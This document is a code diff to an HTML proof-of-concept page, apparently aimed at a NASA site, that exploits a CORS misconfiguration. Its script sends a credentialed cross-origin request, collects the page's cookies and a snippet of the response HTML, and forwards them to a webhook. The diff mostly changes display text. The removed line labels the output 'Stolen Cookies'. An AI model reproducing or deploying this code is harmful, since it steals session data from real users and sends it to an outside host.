@@ -5,7 +5,7 @@
   <title>NASA CORS Session Exploit PoC</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;padding:20px">
-  <h2>Simulating NASA CORS Exploit...</h2>
+  <h2>Simulating NASA CORS Exploit (With Creds)...</h2>
   <pre id="output">Loading...</pre>
 
   <script>
@@ -16,14 +16,17 @@
       credentials: "include",
       mode: "cors"
     })
-    .then(res => res.text())
+    .then(res => {
+      document.getElementById("output").innerText = "🔎 Response Status: " + res.status;
+      return res.text();
+    })
     .then(html => {
       const cookies = document.cookie || "No cookies (likely HttpOnly)";
       const snippet = html.slice(0, 500);
 
-      // عرض الكوكيز و HTML في الصفحة
-      document.getElementById("output").innerText =
-        "Stolen Cookies:\n" + cookies + "\n\nHTML Snippet:\n" + snippet;
+      // عرض النتيجة
+      document.getElementById("output").innerText +=
+        "\n\n🍪 Cookies:\n" + cookies + "\n\n📄 HTML Snippet:\n" + snippet;
 
       // إرسال إلى Webhook
       fetch(webhook, {
@@ -38,7 +41,7 @@
       });
     })
     .catch(err => {
-      document.getElementById("output").innerText = "❌ Failed:\n" + err;
+      document.getElementById("output").innerText = "❌ Fetch error:\n" + err;
     });
   </script>
 </body>
